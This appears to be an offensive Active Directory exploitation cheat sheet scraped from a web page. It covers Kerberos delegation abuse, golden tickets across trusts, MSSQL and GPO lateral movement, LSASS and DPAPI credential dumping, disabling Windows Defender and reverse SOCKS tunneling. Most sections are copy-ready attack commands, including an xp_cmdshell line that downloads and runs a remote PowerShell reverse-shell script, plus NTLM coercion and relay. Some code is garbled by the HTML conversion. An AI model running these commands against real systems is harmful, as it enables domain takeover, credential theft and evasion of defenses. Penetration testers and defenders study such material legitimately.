<p>Unconstrained Delegation can be set on a <em>frontend service</em> (e.g., an IIS web server) to allow it to delegate on behalf of a user to <em>any service in the domain</em> (towards a <em>backend service</em>, such as an MSSQL database).</p>
<p>DACL UAC property: <code>TrustedForDelegation</code>.</p>
<h2 id="exploitation">Exploitation<a class="headerlink" href="#exploitation" title="Permanent link">¶</a></h2>
<p>With administrative privileges on a server with Unconstrained Delegation set, we can dump the TGTs for other users that have a connection. If we do this successfully, we can impersonate the victim user towards any service in the domain.</p>
<p>With Mimikatz:</p>
<p>sekurlsa::tickets /export<br/>
kerberos::ptt c:\path\to\ticket.kirbi</p>
<p>Plaintext</p>
<p>Or with Rubeus:</p>
<p>.\Rubeus.exe triage<br/>
.\Rubeus.exe dump /luid:0x5379f2 /nowrap<br/>
.\Rubeus.exe ptt /ticket:doIFSDCC[...]</p>
<p>PowerShell</p>
<p>We can also gain the hash for a domain controller machine account, if that DC is vulnerable to the printer bug. If we do this successfully, we can DCSync the domain controller (see below) to completely compromise the current domain.</p>
<p>On the server with Unconstrained Delegation, monitor for new tickets with Rubeus.</p>
<p>.\Rubeus.exe monitor /interval:5 /nowrap</p>
<p>PowerShell</p>
<p>From attacking machine, entice the Domain Controller to connect using the printer bug. Binary from <a href="https://github.com/leechristensen/SpoolSample">here</a>.</p>
<p>.\MS-RPRN.exe \dc.targetdomain.com \unconstrained-server.targetdomain.com</p>
<p>PowerShell</p>
<p>The TGT for the machine account of the DC should come in in the first session. We can pass this ticket into our current session to gain DCSync privileges (see below).</p>
<p>.\Rubeus.exe ptt /ticket:doIFxTCCBc...</p>
<p>PowerShell</p>
<h1 id="constrained-delegation">Constrained delegation<a class="headerlink" href="#constrained-delegation" title="Permanent link">¶</a></h1>
<p>Constrained delegation can be set on the <em>frontend server</em> (e.g. IIS) to allow it to delegate to <em>only selected backend services</em> (e.g. MSSQL) on behalf of the user.</p>
<p>DACL UAC property: <code>TrustedToAuthForDelegation</code>. This allows <code>s4u2self</code>, i.e. requesting a TGS on behalf of <em>anyone</em> to oneself, using just the NTLM password hash. This effectively allows the service to impersonate other users in the domain with just their hash, and is useful in situations where Kerberos isn’t used between the user and frontend.</p>
<p>DACL Property: <code>msDS-AllowedToDelegateTo</code>. This property contains the SPNs it is allowed to use <code>s4u2proxy</code> on, i.e. requesting a forwardable TGS for that server based on an existing TGS (often the one gained from using <code>s4u2self</code>). This effectively defines the backend services that constrained delegation is allowed for.</p>
<p><strong>NOTE:</strong> These properties do NOT have to exist together! If <code>s4u2proxy</code> is allowed without <code>s4u2self</code>, user interaction is required to get a valid TGS to the frontend service from a user, similar to unconstrained delegation.</p>
<h2 id="exploitation_1">Exploitation<a class="headerlink" href="#exploitation_1" title="Permanent link">¶</a></h2>
<p>In this case, we use Rubeus to automatically request a TGT and then a TGS with the <code>ldap</code> SPN to allow us to DCSync using a machine account.</p>
<h1 id="get-a-tgt-using-the-compromised-service-account-with-delegation-set-not-needed-if-you-already-have-an-active-session-or-token-as-this-user">Get a TGT using the compromised service account with delegation set (not needed if you already have an active session or token as this user)<a class="headerlink" href="#get-a-tgt-using-the-compromised-service-account-with-delegation-set-not-needed-if-you-already-have-an-active-session-or-token-as-this-user" title="Permanent link">¶</a></h1>
<p>.\Rubeus.exe asktgt /user:svc_with_delegation /domain:targetdomain.com /rc4:2892D26CDF84D7A70E2EB3B9F05C425E# Use s4u2self and s4u2proxy to impersonate the DA user to the allowed SPN<br/>
.\Rubeus.exe s4u /ticket:doIE+jCCBP... /impersonateuser:Administrator /msdsspn:time/dc /ptt# Same as the two above steps, but access the LDAP service on the DC instead (for dcsync)<br/>
.\Rubeus.exe s4u /user:sa_with_delegation /impersonateuser:Administrator /msdsspn:time/dc /altservice:ldap /ptt /rc4:2892D26CDF84D7A70E2EB3B9F05C425E</p>
<p>PowerShell</p>
<h1 id="resource-based-constrained-delegation">Resource-based constrained delegation<a class="headerlink" href="#resource-based-constrained-delegation" title="Permanent link">¶</a></h1>
<p>Resource-Based Constrained Delegation (RBCD) configures the <em>backend server</em> (e.g. MSSQL) to allow <em>only selected frontend services</em> (e.g. IIS) to delegate on behalf of the user. This makes it easier for specific server administrators to configure delegation, without requiring domain admin privileges.</p>
<p>DACL Property: <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>.</p>
<p>In this scenario, <code>s4u2self</code> and <code>s4u2proxy</code> are used as above to request a forwardable ticket on behalf of the user. However, with RBCD, the KDC checks if the SPN for the requesting service (i.e., the <em>frontend service</em>) is present in the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> property of the <em>backend service</em>. This means that the <em>frontend service</em> needs to have an SPN set. Thus, attacks against RBCD have to be performed from either a service account with SPN or a machine account.</p>
<h2 id="exploitation_2">Exploitation<a class="headerlink" href="#exploitation_2" title="Permanent link">¶</a></h2>
<p>If we compromise a <em>frontend service</em> that appears in the RBCD property of a <em>backend service</em>, exploitation is the same as with constrained delegation above. This is however not too common.</p>
<p>A more often-seen attack to RBCD is when we have <code>GenericWrite</code>, <code>GenericAll</code>, <code>WriteProperty</code>, or <code>WriteDACL</code> permissions to a computer object in the domain. This means we can write the <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> property on this machine account to add a controlled SPN or machine account to be trusted for delegation. We can even create a new machine account and add it. This allows us to compromise the target machine in the context of any user, as with constrained delegation.</p>
<h1 id="create-a-new-machine-account-using-powermad">Create a new machine account using PowerMad<a class="headerlink" href="#create-a-new-machine-account-using-powermad" title="Permanent link">¶</a></h1>
<p>New-MachineAccount -MachineAccount NewMachine -Password <span class="arithmatex">\((ConvertTo-SecureString 'P4ssword123!' -AsPlainText -Force)# Get SID of our machine account and bake raw security descriptor for msDS-AllowedtoActOnBehalfOfOtherIdentity property on target  
<span class="arithmatex">(sid = Get-DomainComputer -Identity NewMachine -Properties objectsid | Select -Expand objectsid<br/>
<span class="arithmatex">\(SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;\)</span>(\)</span>sid))"<br/>
<span class="arithmatex">\(SDbytes = New-Object byte[] (\)</span>SD.BinaryLength)<br/>
<span class="arithmatex">\(SD.GetBinaryForm(\)</span>SDbytes,0)# Use PowerView to use our GenericWrite (or similar) priv to apply this SD to the target  
Get-DomainComputer -Identity TargetSrv | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=\)</span>SDBytes}# Finally, use Rubeus to exploit RBCD to get a TGS as admin on the target<br/>
.\Rubeus.exe s4u /user:NewMachine$ /rc4:A9A70FD4DF48FBFAB37E257CFA953312 /impersonateuser:Administrator /msdsspn:CIFS/TargetSrv.targetdomain.com /ptt</p>
<p>PowerShell</p>
<h1 id="abusing-domain-trust">Abusing domain trust<a class="headerlink" href="#abusing-domain-trust" title="Permanent link">¶</a></h1>
<p>All commands must be run with DA privileges in the current domain.</p>
<p>Note that if you completely compromise a child domain (<code>currentdomain.targetdomain.com</code>), you can <em>by definition</em> also compromise the parent domain (<code>targetdomain.com</code>) due to the implicit trust relationship. The same counts for any trust relationship where SID filtering is disabled (see <a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#abusing-inter-forest-trust">‘Abusing inter-forest trust’</a> below).</p>
<h2 id="using-domain-trust-key">Using domain trust key<a class="headerlink" href="#using-domain-trust-key" title="Permanent link">¶</a></h2>
<p>From the DC, dump the hash of the <code>currentdomain\targetdomain$</code> trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain’s enterprise admins group to our ‘SID history’.</p>
<p>kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:targetdomain.com /ticket:c:\users\public\ticket.kirbi</p>
<p>Plaintext</p>
<p>Pass this ticket with Rubeus.</p>
<p>.\Rubeus.exe asktgs /ticket:c:\users\public\ticket.kirbi /service:LDAP/dc.targetdomain.com /dc:dc.targetdomain.com /ptt</p>
<p>PowerShell</p>
<p>We can now DCSync the target domain (see below).</p>
<h2 id="using-krbtgt-hash">Using krbtgt hash<a class="headerlink" href="#using-krbtgt-hash" title="Permanent link">¶</a></h2>
<p>From the DC, dump the krbtgt hash using e.g. DCSync or LSADump. Then, using this hash, forge an inter-realm TGT using Mimikatz, as with the previous method.</p>
<p>Doing this requires the SID of the current domain as the <code>/sid</code> parameter, and the SID of the target domain as part of the <code>/sids</code> parameter. You can grab these using PowerView’s <code>Get-DomainSID</code>. Use a SID History (<code>/sids</code>) of <code>*-516</code> and <code>S-1-5-9</code> to disguise as the Domain Controllers group and Enterprise Domain Controllers respectively, to be less noisy in the logs.</p>
<p>kerberos::golden /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /user:DC$ /groups:516 /ptt</p>
<p>Plaintext</p>
<blockquote>
<p><em>If you are having issues creating this ticket, try adding the ’target’ flag, e.g.</em> <code>_/target:targetdomain.com_</code><em>.</em></p>
</blockquote>
<p>Alternatively, generate a domain admin ticket with SID history of enterprise administrators group in the target domain.</p>
<p>kerberos::golden /user:Administrator /domain:currentdomain.targetdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /sids:S-1-5-21-280534878-1496970234-700767426-519 /ptt</p>
<p>We can now immediately DCSync the target domain, or get a reverse shell using e.g. scheduled tasks.</p>
<h1 id="abusing-inter-forest-trust">Abusing inter-forest trust<a class="headerlink" href="#abusing-inter-forest-trust" title="Permanent link">¶</a></h1>
<p>Since a forest is a security boundary, we can only access domain services that have been shared with the domain we have compromised (our source domain). Use e.g. BloodHound to look for users that have an account (with the same username) in both forests and try password re-use. Additionally, we can use BloodHound or PowerView to hunt for foreign group memberships between forests. The PowerView command:</p>
<p>Get-DomainForeignGroupMember -domain targetdomain.com</p>
<p>PowerShell</p>
<p>In some cases, it is possible that SID filtering (the protection causing the above), is <em>disabled</em> between forests. If you run <code>Get-DomainTrust</code> and you see the <code>TREAT_AS_EXTERNAL</code> property, this is the case! In this case, you can abuse the forest trust like a domain trust, as described above. Note that you still can <em>NOT</em> forge a ticket for any SID between 500 and 1000 though, so you can’t become DA (not even indirectly through group inheritance). In this case, look for groups that grant e.g. local admin on the domain controller or similar non-domain privileges. For more information, refer to <a href="https://dirkjanm.io/active-directory-forest-trusts-part-one-how-does-sid-filtering-work/">this blog post</a>.</p>
<p>To impersonate a user from our source domain to access services in a foreign domain, we can do the following. Extract inter-forest trust key as in <a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#using-domain-trust-key">‘Using domain trust key’</a> above.</p>
<p>Use Mimikatz to generate a TGT for the target domain using the trust key:</p>
<p>Kerberos::golden /user:Administrator /service:krbtgt /domain:currentdomain.com /sid:S-1-5-21-1874506631-3219952063-538504511 /target:targetdomain.com /rc4:fe8884bf222153ca57468996c9b348e9 /ticket:ticket.kirbi</p>
<p>Plaintext</p>
<p>Then, use Rubeus to ask a TGS for e.g. the <code>CIFS</code> service on the target DC using this TGT.</p>
<p>.\Rubeus.exe asktgs /ticket:c:\ad\tools\eucorp-tgt.kirbi /service:CIFS/eurocorp-dc.eurocorp.local /dc:eurocorp-dc.eurocorp.local /ptt</p>
<p>PowerShell</p>
<p>Now we can use the CIFS service on the target forest’s DC as the DA of our source domain (again, as long as this trust was configured to exist).</p>
<h1 id="abusing-mssql-databases-for-lateral-movement">Abusing MSSQL databases for lateral movement<a class="headerlink" href="#abusing-mssql-databases-for-lateral-movement" title="Permanent link">¶</a></h1>
<p>MSSQL databases can be linked, such that if you compromise one you can execute queries (or even OS commands!) on other databases in the context of a specific user (<code>sa</code> maybe? ). If this is configured, it can even be used to traverse Forest boundaries! If we have SQL execution, we can use the following commands to enumerate database links.</p>
<p>-- Find linked servers<br/>
EXEC sp_linkedservers-- Run SQL query on linked server<br/>
select mylogin from openquery("TARGETSERVER", 'select SYSTEM_USER as mylogin')-- Enable 'xp_cmdshell' on remote server and execute commands, only works if RPC is enabled<br/>
EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT TARGETSERVER<br/>
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT TARGETSERVER<br/>
EXEC ('xp_cmdshell ''whoami'' ') AT TARGETSERVER</p>
<p>SQL</p>
<p>We can also use <a href="https://github.com/NetSPI/PowerUpSQL">PowerUpSQL</a> to look for databases within the domain, and gather further information on (reachable) databases. We can also automatically look for, and execute queries or commands on, linked databases (even through multiple layers of database links).</p>
<h1 id="get-mssql-databases-in-the-domain-and-test-connectivity">Get MSSQL databases in the domain, and test connectivity<a class="headerlink" href="#get-mssql-databases-in-the-domain-and-test-connectivity" title="Permanent link">¶</a></h1>
<p>Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft# Try to get information on all domain databases<br/>
Get-SQLInstanceDomain | Get-SQLServerInfo# Get information on a single reachable database<br/>
Get-SQLServerInfo -Instance TARGETSERVER# Scan for MSSQL misconfigurations to escalate to SA<br/>
Invoke-SQLAudit -Verbose -Instance TARGETSERVER# Execute SQL query<br/>
Get-SQLQuery -Query "SELECT system_user" -Instance TARGETSERVER# Run command (enables XP_CMDSHELL automatically if required)<br/>
Invoke-SQLOSCmd -Instance TARGETSERVER -Command "whoami" |  select -ExpandProperty CommandResults# Automatically find all linked databases<br/>
Get-SqlServerLinkCrawl -Instance TARGETSERVER | select instance,links | ft# Run command if XP_CMDSHELL is enabled on any of the linked databases<br/>
Get-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell "whoami"' | select instance,links,customquery | ftGet-SqlServerLinkCrawl -Instance TARGETSERVER -Query 'EXEC xp_cmdshell "powershell.exe -c iex (new-object net.webclient).downloadstring(''http://172.16.100.55/Invoke-PowerShellTcpRun.ps1'')"' | select instance,links,customquery | ft</p>
<p>PowerShell</p>
<p>If you have low-privileged access to a MSSQL database and no links are present, you could potentially force NTLM authentication by using the <code>xp_dirtree</code> stored procedure to access this share. If this is successful, the NetNTLM for the SQL service account can be collected and potentially cracked or relayed to compromise machines as that service account.</p>
<p>EXEC master..xp_dirtree "\192.168.49.67\share"</p>
<p>SQL</p>
<p>Example command to relay the hash to authenticate as local admin (if the service account has these privileges) and run <code>calc.exe</code>. Omit the <code>-c</code> parameter to attempt a <code>secretsdump</code> instead.</p>
<p>sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.67.6 -c 'calc.exe'</p>
<p>Bash</p>
<h1 id="abusing-group-policy-objects-for-lateral-movement">Abusing Group Policy Objects for lateral movement<a class="headerlink" href="#abusing-group-policy-objects-for-lateral-movement" title="Permanent link">¶</a></h1>
<p>If we identify that we have the permissions to edit and link new Group Policy Objects (GPOs) within the domain (refer to <a href="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/#ad-enumeration-with-powerview">‘AD Enumeration With PowerView’</a>), we can abuse these privileges to move laterally towards other machines.</p>
<p>As an example, we can use the legitimate <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/remote-server-administration-tools">Remote System Administration Tools</a> (RSAT) for Windows to create a new GPO, link it to the target, and deploy a registry runkey to add a command that will run automatically the next time the machine boots.</p>
<h1 id="create-a-new-gpo-and-link-it-to-the-target-server">Create a new GPO and link it to the target server<a class="headerlink" href="#create-a-new-gpo-and-link-it-to-the-target-server" title="Permanent link">¶</a></h1>
<p>New-GPO -Name 'Totally Legit GPO' | New-GPLink -Target 'OU=TargetComputer,OU=Workstations,DC=TargetDomain,DC=com'# Link an existing GPO to another target server<br/>
New-GPLink -Target 'OU=TargetComputer2,OU=Workstations,DC=TargetDomain,DC=com' -Name 'Totally Legit GPO'# Deploy a registry runkey via the GPO<br/>
Set-GPPrefRegistryValue -Name 'Totally Legit GPO' -Context Computer -Action Create -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Value 'cmd.exe /c calc.exe' -Type ExpandString</p>
<p>PowerShell</p>
<p>We can also use <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a> to deploy an immediate scheduled task, which will run whenever the group policy is refreshed (every 1–2 hours by default). SharpGPOABuse does not create its own GPO objects, so we first have to run the commands for creating and linking GPOs listed above. After this, we can run SharpGPOAbuse to deploy the immediate task.</p>
<p>SharpGPOAbuse.exe --AddComputerTask --TaskName "Microsoft LEGITIMATE Hotfix" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c start calc.exe" --GPOName "Totally Legit GPO"</p>
<h1 id="post-exploitation">Post-Exploitation<a class="headerlink" href="#post-exploitation" title="Permanent link">¶</a></h1>
<h1 id="lsass-protection">LSASS protection<a class="headerlink" href="#lsass-protection" title="Permanent link">¶</a></h1>
<p>Sometimes, LSASS is configured to run as a protected process (PPL). You can query this with PowerShell as follows.</p>
<p>Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"</p>
<p>PowerShell</p>
<p>If this is the case, you can’t just dump or parse LSASS, and you need to disable the protection with something like <code>mimidrv.sys</code>. I won’t discuss how to do that here, but there are tools such as <a href="https://github.com/itm4n/PPLdump">PPLDump</a> available to help.</p>
<h1 id="dumping-os-credentials-with-mimikatz">Dumping OS credentials with Mimikatz<a class="headerlink" href="#dumping-os-credentials-with-mimikatz" title="Permanent link">¶</a></h1>
<h1 id="dump-logon-passwords">Dump logon passwords<a class="headerlink" href="#dump-logon-passwords" title="Permanent link">¶</a></h1>
<p>sekurlsa::logonpasswords# Dump all domain hashes from a DC  </p>
<h2 id="note-everything-with-patch-is-noisy-as-heck-since-it-writes-to-lsass">Note: Everything with /patch is noisy as heck since it writes to LSASS 🚩<a class="headerlink" href="#note-everything-with-patch-is-noisy-as-heck-since-it-writes-to-lsass" title="Permanent link">¶</a></h2>
<p>lsadump::lsa /patch# Dump only local users<br/>
lsadump::sam# DCSync (requires 'ldap' SPN)<br/>
lsadump::dcsync /user:DOMAIN\krbtgt /domain:targetdomain.com# Dump Windows secrets, such as stored creds for scheduled tasks (elevate first) 🚩<br/>
vault::list<br/>
vault::cred /patch# Dump Kerberos encryption keys, including the AES256 key for better opsec (see 'Lateral Movement with Rubeus' section) <br/>
sekurlsa::ekeys</p>
<p>Plaintext</p>
<h1 id="abusing-the-data-protection-api-dpapi-with-mimikatz">Abusing the Data Protection API (DPAPI) with Mimikatz<a class="headerlink" href="#abusing-the-data-protection-api-dpapi-with-mimikatz" title="Permanent link">¶</a></h1>
<p>Mimikatz has quite some functionality to access Windows’ DPAPI, which is used to encrypt many credentials, including e.g. browser passwords.</p>
<p>Note that Mimikatz will automatically cache the master keys that it has seen (check cache with <code>dpapi::cache</code>), but this does <em>NOT</em> work if no Mimikatz session is persisted (e.g. in Cobalt Strike or when using <code>Invoke-Mimikatz</code>). More information on using Mimikatz for DPAPI is available <a href="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials">here</a>.</p>
<h1 id="find-the-ids-of-protected-secrets-for-a-specific-user">Find the IDs of protected secrets for a specific user<a class="headerlink" href="#find-the-ids-of-protected-secrets-for-a-specific-user" title="Permanent link">¶</a></h1>
<p>dir C:\Users[USERNAME]\AppData\Local\Microsoft\Credentials# Get information, including the used master key ID, from a specific secret (take the path from above)<br/>
dpapi::cred /in:C:\Users[USERNAME]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3# IF YOU ARE PRIVILEGED  </p>
<h1 id="dump-all-master-keys-from-the-current-system">Dump all master keys from the current system<a class="headerlink" href="#dump-all-master-keys-from-the-current-system" title="Permanent link">¶</a></h1>
<p>sekurlsa::dpapi# IF YOU ARE NOT PRIVILEGED (session as target user required)  </p>
<h1 id="get-the-master-key-from-the-domain-using-rpc-the-path-contains-the-user-sid-and-then-the-id-of-the-masterkey-identified-in-the-previous-step">Get the master key from the domain using RPC (the path contains the user SID, and then the ID of the masterkey identified in the previous step)<a class="headerlink" href="#get-the-master-key-from-the-domain-using-rpc-the-path-contains-the-user-sid-and-then-the-id-of-the-masterkey-identified-in-the-previous-step" title="Permanent link">¶</a></h1>
<p>dpapi::masterkey /rpc /in:C:\Users[USERNAME]\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1124\dd89dddf-946b-4a80-9fd3-7f03ebd41ff4# Decrypt the secret using the retrieved master key  </p>
<h1 id="alternatively-leave-out-masterkey-and-add-unprotect-to-decrypt-the-secret-using-the-cached-master-key-see-above-for-caveats">Alternatively, leave out /masterkey and add /unprotect to decrypt the secret using the cached master key (see above for caveats)<a class="headerlink" href="#alternatively-leave-out-masterkey-and-add-unprotect-to-decrypt-the-secret-using-the-cached-master-key-see-above-for-caveats" title="Permanent link">¶</a></h1>
<p>dpapi::cred /in:C:\Users[USERNAME]]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3 /masterkey:91721d8b1ec[...]e0f02c3e44deece5f318ad</p>
<p>Plaintext</p>
<h1 id="dumping-secrets-without-mimikatz">Dumping secrets without Mimikatz<a class="headerlink" href="#dumping-secrets-without-mimikatz" title="Permanent link">¶</a></h1>
<p>We can also parse system secrets without using Mimikatz on the target system directly.</p>
<h2 id="dumping-lsass">Dumping LSASS<a class="headerlink" href="#dumping-lsass" title="Permanent link">¶</a></h2>
<p>The preferred way to run Mimikatz is to do it locally with a dumped copy of LSASS memory from the target. <a href="https://github.com/outflanknl/Dumpert">Dumpert</a>, <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump">Procdump</a>, or other (custom) tooling can be used to dump LSASS memory.</p>
<h1 id="dump-lsass-memory-through-a-process-snapshot-r-avoiding-interacting-with-it-directly">Dump LSASS memory through a process snapshot (-r), avoiding interacting with it directly<a class="headerlink" href="#dump-lsass-memory-through-a-process-snapshot-r-avoiding-interacting-with-it-directly" title="Permanent link">¶</a></h1>
<p>.\procdump.exe -r -ma lsass.exe lsass.dmp</p>
<p>PowerShell</p>
<p>After downloading the memory dump file on our attacking system, we can run Mimikatz and switch to ‘Minidump’ mode to parse the file as follows. After this, we can run Mimikatz’ credential retrieval commands as usual.</p>
<p>sekurlsa::minidump lsass.dmp</p>
<p>Plaintext</p>
<h2 id="dumping-secrets-from-the-registry">Dumping secrets from the registry<a class="headerlink" href="#dumping-secrets-from-the-registry" title="Permanent link">¶</a></h2>
<p>We can dump secrets from the registry and parse the files “offline” to get a list of system secrets. 🚩</p>
<p>On the target, we run the following:</p>
<p>reg.exe save hklm\sam c:\users\public\downloads\sam.save<br/>
reg.exe save hklm\system c:\users\public\downloads\system.save<br/>
reg.exe save hklm\security c:\users\public\downloads\security.save</p>
<p>PowerShell</p>
<p>Then on our attacking box we can dump the secrets with Impacket:</p>
<p>impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL &gt; secrets.out</p>
<p>Bash</p>
<h2 id="dumping-secrets-from-a-volume-shadow-copy">Dumping secrets from a Volume Shadow Copy<a class="headerlink" href="#dumping-secrets-from-a-volume-shadow-copy" title="Permanent link">¶</a></h2>
<p>We can also create a “Volume Shadow Copy” of the <code>SAM</code> and <code>SYSTEM</code> files (which are always locked on the current system), so we can still copy them over to our local system. An elevated prompt is required for this.</p>
<p>wmic shadowcopy call create Volume='C:\'<br/>
copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\users\public\sam.save<br/>
copy \?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\system C:\users\public\system.save</p>
<p>PowerShell</p>
<h1 id="windows-defender-evasion">Windows Defender evasion<a class="headerlink" href="#windows-defender-evasion" title="Permanent link">¶</a></h1>
<p><em>Note: All below commands require administrative privileges on the system!</em></p>
<p>You can query Defender exclusions using PowerShell. If it returns any excluded paths, just execute your malware from there!</p>
<p>Get-MpPreference | select-object -ExpandProperty ExclusionPath</p>
<p>PowerShell</p>
<p>Alternatively, you could add an exclusion directory for your shady stuff. 👀</p>
<p>Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads\SuperLegitDownloadDirectory"</p>
<p>PowerShell</p>
<p>If you’re more aggro, you can disable Defender entirely. It goes without saying that disabling AV/EDR products is never a good idea in practice, best to work around it instead. 🚩</p>
<h1 id="disable-realtime-monitoring-altogether">Disable realtime monitoring altogether<a class="headerlink" href="#disable-realtime-monitoring-altogether" title="Permanent link">¶</a></h1>
<p>Set-MpPreference -DisableRealtimeMonitoring $true# Only disables scanning for downloaded files or attachments<br/>
Set-MpPreference -DisableIOAVProtection $true</p>
<p>PowerShell</p>
<p>As an alternative to disabling Defender, you can leave it enabled and just remove all virus signatures from it.</p>
<p>"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All</p>
<p>PowerShell</p>
<h1 id="chisel-proxying">Chisel proxying<a class="headerlink" href="#chisel-proxying" title="Permanent link">¶</a></h1>
<p>If you need to proxy traffic over a compromised Windows machine, <a href="https://github.com/jpillora/chisel">Chisel</a> (or <a href="https://github.com/shantanu561993/SharpChisel">SharpChisel</a>) is a good choice. Chisel allows port forwarding, but my favorite technique is setting up a reverse SOCKS proxy on the target machine, allowing you to tunnel any traffic over the target system.</p>
<p>On our attacking machine (Linux in this case), we start a Chisel server on port 80 in reverse SOCKS5 mode.</p>
<p>sudo ./chisel server -p 80 --reverse --socks5</p>
<p>Bash</p>
<p>Then, on our compromised target system, we connect to this server and tell it to proxy all traffic over it via the reverse SOCKS5 tunnel.</p>
<p>.\chisel.exe client 192.168.49.67:80 R:socks</p>
<p>PowerShell</p>
<p>A proxy is now open on port 1080 of our linux machine. We can now use e.g. ProxyChains to tunnel over the target system.</p>
<h1 id="interesting-files">Interesting files<a class="headerlink" href="#interesting-files" title="Permanent link">¶</a></h1>
<p>There are lots of files that may contain interesting information. Tools like <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS">WinPEAS</a> or collections like <a href="https://github.com/PowerShellMafia/PowerSploit">PowerSploit</a> may help in identifying juicy files (for privesc or post-exploitation).</p>
<p>Below is a list of some files I have encountered to be of relevance. Check files based on the programs and/or services that are installed on the machine.</p>
<blockquote>
<p><em>In addition, don’t forget to enumerate any local databases with</em> <code>_sqlcmd_</code> <em>or</em> <code>_Invoke-SqlCmd_</code><em>!</em></p>
</blockquote>
<h1 id="all-user-folders">All user folders<a class="headerlink" href="#all-user-folders" title="Permanent link">¶</a></h1>
<h2 id="limit-this-command-if-there-are-too-many-files">Limit this command if there are too many files ;)<a class="headerlink" href="#limit-this-command-if-there-are-too-many-files" title="Permanent link">¶</a></h2>
<pre><code>tree /f /a C:\Users# Web.config  
C:\inetpub\www\*\web.config# Unattend files  
C:\Windows\Panther\Unattend.xml# RDP config files  
C:\ProgramData\Configs\# Powershell scripts/config files  
C:\Program Files\Windows PowerShell\# PuTTy config  
C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty# FileZilla creds  
C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml# Jenkins creds (also check out the Windows vault, see above)  
C:\Program Files\Jenkins\credentials.xml# WLAN profiles  
C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml# TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)  
Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password
</code></pre>
</article>
</div>
</div>
</main>
<footer class="md-footer">
<div class="md-footer-meta md-typeset">
<div class="md-footer-meta__inner md-grid">
<div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" rel="noopener" target="_blank">
      Material for MkDocs
    </a>
</div>
</div>
</div>
</footer>
</div>
<div class="md-dialog" data-md-component="dialog">
<div class="md-dialog__inner md-typeset"></div>
</div>
<script id="__config" type="application/json">{"base": "..", "features": [], "search": "../assets/javascripts/workers/search.e5c33ebb.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
<script src="../assets/javascripts/bundle.51d95adb.min.js"></script>
<script src="../javascripts/mathjax.js"></script>
<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
<script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
<script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
</body>
</html>